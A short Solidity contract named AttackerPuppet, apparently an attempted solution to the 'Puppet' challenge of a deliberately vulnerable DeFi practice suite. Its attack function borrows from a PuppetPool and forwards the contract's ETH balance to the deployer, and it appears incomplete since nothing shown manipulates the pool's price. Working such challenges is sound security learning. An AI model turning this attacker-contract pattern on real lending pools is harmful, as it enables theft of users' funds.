// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//import "../DamnValuableToken.sol";
import "./PuppetPool.sol";


contract AttackerPuppet {

    PuppetPool public pool;
    address payable public owner;

    constructor(address _poolAddress) {
        pool = PuppetPool(_poolAddress);
        owner = payable(msg.sender);
    }

    function attack(uint _amount) public {
        pool.borrow{value: _amount}(100000);
        owner.transfer(address(this). balance);
    }
}